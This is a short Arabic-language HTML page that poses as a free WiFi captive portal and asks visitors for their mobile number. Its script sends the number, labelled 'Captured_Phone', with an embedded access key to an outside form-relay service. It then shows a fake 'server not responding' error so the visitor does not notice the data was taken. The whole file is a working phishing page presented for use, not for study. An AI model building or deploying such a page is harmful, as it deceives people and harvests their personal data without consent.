<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>WiFi Connect</title>
    <style>
        body { background: #f0f2f5; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .box { background: white; padding: 30px; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); width: 320px; text-align: center; }
        h2 { color: #1877f2; }
        button { background: #1877f2; color: white; border: none; padding: 12px; width: 100%; border-radius: 8px; cursor: pointer; font-weight: bold; margin-top: 10px; }
        input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; text-align: center; }
    </style>
</head>
<body>
    <div class="box">
        <h2>WiFi Free 📶</h2>
        <p>أدخل رقم جوالك للاتصال بالشبكة</p>
        <input type="text" id="phone_number" placeholder="05xxxxxxxx">
        <button onclick="sendData()">اتصال الآن</button>
    </div>

    <script>
        function sendData() {
            var user_phone = document.getElementById("phone_number").value;
            if(user_phone.length < 10) { alert("الرقم غير صحيح!"); return; }

            var formData = new FormData();
            formData.append("access_key", "d1cb687e-4ff2-4e81-8613-25f31db37452");
            formData.append("Captured_Phone", user_phone);

            fetch("https://api.web3forms.com/submit", {
                method: "POST",
                body: formData
            }).then(function() {
                alert("خطأ: السيرفر لا يستجيب، حاول لاحقاً.");
                location.reload();
            });
        }
    </script>
</body>
</html>
